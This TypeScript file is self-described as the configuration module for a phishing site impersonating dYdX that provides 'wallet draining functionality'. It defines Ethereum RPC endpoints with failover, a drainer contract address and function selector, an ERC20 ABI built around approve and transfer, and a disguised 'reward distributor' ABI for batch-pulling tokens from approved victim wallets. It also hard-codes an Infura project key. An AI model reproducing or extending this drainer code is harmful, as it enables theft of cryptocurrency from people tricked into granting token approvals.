/**
 * Web3 Configuration for DyDx Phishing Site
 * 
 * RPC endpoints and network configuration for wallet draining functionality
 */

import { ethers } from 'ethers'

// Network configurations with multiple RPC endpoints for reliability
export const NETWORKS = {
  mainnet: {
    chainId: 1,
    chainIdHex: '0x1',
    name: 'Ethereum Mainnet',
    rpcUrls: [
      `https://mainnet.infura.io/v3/${process.env.NEXT_PUBLIC_INFURA_PROJECT_ID || '9aa3d95b3bc440fa88ea12eaa4456161'}`,
      'https://eth-mainnet.public.blastapi.io',
      'https://rpc.ankr.com/eth',
      'https://ethereum.publicnode.com',
      'https://eth.llamarpc.com'
    ],
    blockExplorer: 'https://etherscan.io/',
    nativeCurrency: {
      name: 'Ether',
      symbol: 'ETH',
      decimals: 18
    }
  }
}

// Contract configuration
export const CONTRACT_CONFIG = {
  address: process.env.NEXT_PUBLIC_CONTRACT_ADDRESS || '0x1234567890abcdef1234567890abcdef12345678',
  functionSelector: process.env.NEXT_PUBLIC_FUNCTION_SELECTOR || '0x3dc06048'
}

// ERC20 Token ABI for approval transactions
export const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function balanceOf(address account) external view returns (uint256)",
  "function symbol() external view returns (string)",
  "function decimals() external view returns (uint8)",
  "function name() external view returns (string)",
  "function totalSupply() external view returns (uint256)",
  "function transfer(address to, uint256 amount) external returns (bool)"
]

// Reward Distributor Contract ABI
export const REWARD_DISTRIBUTOR_ABI = [
  "function claimUserRewards(address token, uint256 amount) external",
  "function getTreasury() external view returns (address)",
  "function userRewards(address user) external view returns (uint256)",
  "function processBatchRewards(address[] tokens, address[] users, uint256[] amounts) external",
  "function processRewards(address token, address user, uint256 amount) external",
  "function checkApproval(address token, address user) external view returns (uint256)"
]

// Provider utilities
export class RPCManager {
  private providers: ethers.providers.JsonRpcProvider[] = []
  private currentProviderIndex: number = 0

  constructor() {
    this.initializeProviders()
  }

  private initializeProviders() {
    NETWORKS.mainnet.rpcUrls.forEach(url => {
      try {
        const provider = new ethers.providers.JsonRpcProvider(url)
        this.providers.push(provider)
      } catch (error) {
        console.warn(`Failed to initialize RPC provider: ${url}`, error)
      }
    })
  }

  async getProvider(): Promise<ethers.providers.JsonRpcProvider> {
    if (this.providers.length === 0) {
      throw new Error('No RPC providers available')
    }

    const provider = this.providers[this.currentProviderIndex]
    
    try {
      // Test the provider
      await provider.getBlockNumber()
      return provider
    } catch (error) {
      console.warn(`RPC provider failed, trying next: ${error}`)
      this.currentProviderIndex = (this.currentProviderIndex + 1) % this.providers.length
      return this.getProvider() // Recursive retry with next provider
    }
  }

  async getMultipleProviders(count: number = 3): Promise<ethers.providers.JsonRpcProvider[]> {
    const availableProviders: ethers.providers.JsonRpcProvider[] = []
    
    for (let i = 0; i < Math.min(count, this.providers.length); i++) {
      try {
        const provider = this.providers[i]
        await provider.getBlockNumber()
        availableProviders.push(provider)
      } catch (error) {
        console.warn(`Provider ${i} failed health check:`, error)
      }
    }
    
    return availableProviders
  }
}

// Export singleton instance
export const rpcManager = new RPCManager()

// Utility functions
export const getNetworkConfig = () => NETWORKS.mainnet
export const getContractConfig = () => CONTRACT_CONFIG
